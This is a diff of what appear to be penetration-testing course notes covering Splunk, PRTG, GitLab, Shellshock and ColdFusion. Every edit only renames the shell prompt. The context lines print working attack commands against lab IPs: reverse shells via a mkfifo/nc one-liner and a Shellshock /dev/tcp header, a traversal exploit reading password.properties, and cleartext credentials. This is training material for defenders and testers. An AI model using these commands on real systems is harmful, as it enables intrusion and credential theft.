@@ -2941,7 +2941,7 @@ We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap
 &#x20; Splunk - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap -sV 10.129.201.50
+root@htb[/htb]$ sudo nmap -sV 10.129.201.50
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 08:43 EDT
 Nmap scan report for 10.129.201.50
@@ -3000,7 +3000,7 @@ To achieve this, we first need to create a custom Splunk application using the f
 &#x20; Attacking Splunk
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tree splunk_shell/
+root@htb[/htb]$ tree splunk_shell/
 
 splunk_shell/
 ├── bin
@@ -3024,7 +3024,7 @@ The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inpu
 &#x20; Attacking Splunk
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat inputs.conf 
+root@htb[/htb]$ cat inputs.conf 
 
 [script://./bin/rev.py]
 disabled = 0  
@@ -3052,7 +3052,7 @@ Once the files are created, we can create a tarball or `.spl` file.
 &#x20; Attacking Splunk
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
+root@htb[/htb]$ tar -cvzf updater.tar.gz splunk_shell/
 
 splunk_shell/
 splunk_shell/bin/
@@ -3072,7 +3072,7 @@ Before uploading the malicious custom app, let's start a listener using Netcat o
 &#x20; Attacking Splunk
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nc -lnvp 443
+root@htb[/htb]$ sudo nc -lnvp 443
 
 listening on [any] 443 ...
 ```
@@ -3086,7 +3086,7 @@ As soon as we upload the application, a reverse shell is received as the status 
 &#x20; Attacking Splunk
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nc -lnvp 443
+root@htb[/htb]$ sudo nc -lnvp 443
 
 listening on [any] 443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.201.50] 53145
@@ -3147,7 +3147,7 @@ We can quickly discover PRTG from an Nmap scan. It can typically be found on com
 &#x20; PRTG Network Monitor
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
+root@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
 Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
@@ -3197,7 +3197,7 @@ From the enumeration we performed so far, it seems to be PRTG version `17.3.33.2
 &#x20; PRTG Network Monitor
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
+root@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version
 
   <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
 <div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
@@ -3237,7 +3237,7 @@ Since this is a blind command execution, we won't get any feedback, so we'd have
 &#x20; PRTG Network Monitor
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
+root@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 
 
 SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
 SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
@@ -3325,7 +3325,7 @@ Let's say we are on an external penetration test. During our OSINT and informati
 &#x20; osTicket
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
+root@htb[/htb]$ sudo python3 dehashed.py -q inlanefreight.local -p
 
 id : 5996447501
 email : julie.clayton@inlanefreight.local
@@ -3358,7 +3358,7 @@ This dump shows cleartext passwords for two different users: `jclayton` and `kgr
 &#x20; osTicket
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cat ilfreight_subdomains
+root@htb[/htb]$ cat ilfreight_subdomains
 
 vpn.inlanefreight.local
 support.inlanefreight.local
@@ -3508,7 +3508,7 @@ Downloading the script and running it against the target GitLab instance, we see
 &#x20; Attacking GitLab
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
+root@htb[/htb]$ ./gitlab_userenum.sh --url http://gitlab.inlanefreight.local:8081/ --userlist users.txt
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
   			             GitLab User Enumeration Script
@@ -3549,7 +3549,7 @@ As this is authenticated remote code execution, we first need a valid username a
 &#x20; Attacking GitLab
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
+root@htb[/htb]$ python3 gitlab_13_10_2_rce.py -t http://gitlab.inlanefreight.local:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f '
 
 [1] Authenticating
 Successfully Authenticated
@@ -3563,7 +3563,7 @@ And we get a shell almost instantly.
 &#x20; Attacking GitLab
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nc -lnvp 8443
+root@htb[/htb]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
 connect to [10.10.14.15] from (UNKNOWN) [10.129.201.88] 60054
@@ -3643,7 +3643,7 @@ Scan the target using `nmap`, this will help to pinpoint active services current
 &#x20; Attacking Tomcat CGI
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 
+root@htb[/htb]$ nmap -p- -sC -Pn 10.129.204.227 --open 
 
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 13:57 SAST
 Nmap scan report for 10.129.204.227
@@ -3690,7 +3690,7 @@ One way to uncover web server content is by utilising the `ffuf` web enumeration
 &#x20; Attacking Tomcat CGI
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+root@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
 
 
         /'___\  /'___\           /'___\       
@@ -3724,7 +3724,7 @@ Since the operating system is Windows, we aim to fuzz for batch scripts. Althoug
 &#x20; Attacking Tomcat CGI
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
+root@htb[/htb]$ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
 
 
         /'___\  /'___\           /'___\       
@@ -3901,7 +3901,7 @@ We can hunt for CGI scripts using a tool such as `Gobuster`. Here we find one, `
 &#x20; Attacking Common Gateway Interface (CGI) Applications - Shellshock
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
+root@htb[/htb]$ gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
 
 ===============================================================
 Gobuster v3.1.0
@@ -3930,7 +3930,7 @@ Next, we can cURL the script and notice that nothing is output to us, so perhaps
 &#x20; Attacking Common Gateway Interface (CGI) Applications - Shellshock
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
+root@htb[/htb]$ curl -i http://10.129.204.231/cgi-bin/access.cgi
 
 HTTP/1.1 200 OK
 Date: Thu, 23 Mar 2023 13:28:55 GMT
@@ -3946,7 +3946,7 @@ To check for the vulnerability, we can use a simple `cURL` command or use Burp S
 &#x20; Attacking Common Gateway Interface (CGI) Applications - Shellshock
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
+root@htb[/htb]$ curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -3991,7 +3991,7 @@ Once the vulnerability has been confirmed, we can obtain reverse shell access in
 &#x20; Attacking Common Gateway Interface (CGI) Applications - Shellshock
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
+root@htb[/htb]$ curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
 ```
 
 From here, we could begin hunting for sensitive data or attempt to escalate privileges. During a network penetration test, we could try to use this host to pivot further into the internal network.
@@ -3999,7 +3999,7 @@ From here, we could begin hunting for sensitive data or attempt to escalate priv
 &#x20; Attacking Common Gateway Interface (CGI) Applications - Shellshock
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ sudo nc -lvnp 7777
+root@htb[/htb]$ sudo nc -lvnp 7777
 
 listening on [any] 7777 ...
 connect to [10.10.14.38] from (UNKNOWN) [10.129.204.231] 52840
@@ -4912,7 +4912,7 @@ During a penetration testing enumeration, several ways exist to identify whether
 &#x20; ColdFusion - Discovery & Enumeration
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open
+root@htb[/htb]$ nmap -p- -sC -Pn 10.129.247.30 --open
 
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-13 11:45 GMT
 Nmap scan report for 10.129.247.30
@@ -4959,7 +4959,7 @@ Now that we know that ColdFusion 8 is a target, the next step is to check for ex
 &#x20; Attacking ColdFusion
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ searchsploit adobe coldfusion
+root@htb[/htb]$ searchsploit adobe coldfusion
 
 ------------------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                            |  Path
@@ -5049,7 +5049,7 @@ Using `searchsploit`, copy the exploit to a working directory and then execute t
 &#x20; Attacking ColdFusion
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ searchsploit -p 14641
+root@htb[/htb]$ searchsploit -p 14641
 
   Exploit: Adobe ColdFusion - Directory Traversal
       URL: https://www.exploit-db.com/exploits/14641
@@ -5064,8 +5064,8 @@ Copied EDB-ID #14641's path to the clipboard
 &#x20; Attacking ColdFusion
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
-AbdulrahmanTamim@htb[/htb]$ python2 14641.py 
+root@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
+root@htb[/htb]$ python2 14641.py 
 
 usage: 14641.py <host> <port> <file_path>
 example: 14641.py localhost 80 ../../../../../../../lib/password.properties
@@ -5081,7 +5081,7 @@ By providing the correct parameters to the exploit script and specifying the pat
 &#x20; Attacking ColdFusion
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
+root@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
 
 ------------------------------
 trying /CFIDE/wizards/common/_logintowizard.cfm
@@ -5143,14 +5143,14 @@ http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connector
 &#x20; Attacking ColdFusion
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ searchsploit -p 50057
+root@htb[/htb]$ searchsploit -p 50057
 
   Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
       URL: https://www.exploit-db.com/exploits/50057
      Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
 File Type: Python script, ASCII text executable
 
-Copied EDB-ID #50057AbdulrahmanTamim@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
+Copied EDB-ID #50057root@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
 ```
 
 A quick `cat` review of the code indicates that the script needs some information. Set the correct information and launch the exploit.
@@ -5176,7 +5176,7 @@ The exploit will take a bit of time to launch, but it eventually will return a f
 &#x20; Attacking ColdFusion
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ python3 50057.py 
+root@htb[/htb]$ python3 50057.py 
 
 Generating a payload...
 Payload size: 1497 bytes
@@ -5487,7 +5487,7 @@ For example, `ldapsearch` is a command-line utility used to search for informati
 &#x20; LDAP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
+root@htb[/htb]$ ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"
 
 ```
 
@@ -5569,7 +5569,7 @@ Enumerating the target helps us to understand services and exposed ports. An `nm
 &#x20; LDAP
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
+root@htb[/htb]$ nmap -p- -sC -sV --open --min-rate=1000 10.129.204.229
 
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-23 14:43 SAST
 Nmap scan report for 10.129.204.229
@@ -5727,7 +5727,7 @@ The `octopus_checker` binary is found on a remote machine during the testing. Ru
 &#x20; Attacking Applications Connecting to Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ./octopus_checker 
+root@htb[/htb]$ ./octopus_checker 
 
 Program had started..
 Attempting Connection 
@@ -5744,7 +5744,7 @@ The binary probably connects using a SQL connection string that contains credent
 &#x20; Attacking Applications Connecting to Services
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ gdb ./octopus_checker
+root@htb[/htb]$ gdb ./octopus_checker
 
 GNU gdb (Debian 9.2-1) 9.2
 Copyright (C) 2020 Free Software Foundation, Inc.
